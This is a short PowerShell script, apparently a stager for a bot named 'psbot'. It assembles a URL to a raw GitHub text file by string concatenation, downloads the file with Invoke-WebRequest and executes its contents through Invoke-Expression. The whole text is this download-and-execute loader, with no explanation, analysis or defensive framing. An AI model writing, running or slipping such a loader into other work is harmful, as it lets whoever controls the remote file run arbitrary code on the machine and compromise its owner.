$ip="raw.githubusercontent.com/josevi0/psbot/master"
$file="cuenta1"

$uri = "https://";$uri+=$ip;$uri+="/";$uri+=$file;$uri+=".txt"
$uri

$down= Invoke-WebRequest $uri
Invoke-Expression $down.content
